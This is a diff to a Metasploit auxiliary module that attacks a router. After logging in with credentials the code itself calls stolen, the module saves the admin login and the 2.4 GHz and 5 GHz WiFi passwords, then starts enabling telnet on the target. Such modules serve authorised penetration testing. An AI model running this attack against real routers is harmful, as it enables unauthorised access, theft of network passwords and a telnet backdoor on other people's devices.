@@ -46,11 +46,6 @@ class MetasploitModule < Msf::Auxiliary
         'DefaultTarget' => 0
       )
     )
-    register_options(
-      [
-        Opt::RPORT(80)
-      ]
-    )
   end
 
   def check
@@ -208,36 +203,34 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good('Successfully logged into target router using the stolen credentials!')
-    print_status('Attempting to store credentials for future use...')
+    print_status('Attempting to store stolen admin and WiFi credentials for future use...')
 
     # Create HTTP Login Data
-    service_data = {
+    store_valid_credential(user: username, private: password, private_type: :password)
+
+    # Create regular WiFi credential
+    wifi_data = {
+      origin_type: :import,
       address: datastore['RHOST'],
-      port: datastore['RPORT'],
-      service_name: 'http',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
       module_fullname: fullname,
-      origin_type: :service,
-      private_data: password,
-      private_type: :password,
-      username: username
+      workspace_id: myworkspace_id,
+      filename: "wifi_#{wifi_ssid}_creds.txt",
+      private_data: wifi_password,
+      private_type: :password
     }
+    create_credential(wifi_data)
 
-    credential_data.merge!(service_data)
-
-    credential_core = create_credential(credential_data)
-
-    login_data = {
-      core: credential_core,
-      last_attempted_at: DateTime.now,
-      status: Metasploit::Model::Login::Status::SUCCESSFUL
-    }.merge(service_data)
-
-    create_credential_login(login_data)
+    # Create 5G WiFi credential
+    wifi_data_5g = {
+      origin_type: :import,
+      address: datastore['RHOST'],
+      module_fullname: fullname,
+      workspace_id: myworkspace_id,
+      filename: "wifi_#{wifi_ssid_5g}_creds.txt",
+      private_data: wifi_password_5g,
+      private_type: :password
+    }
+    create_credential(wifi_data_5g)
 
     print_status('Enabling telnet on the target router...')
     res = send_request_cgi(
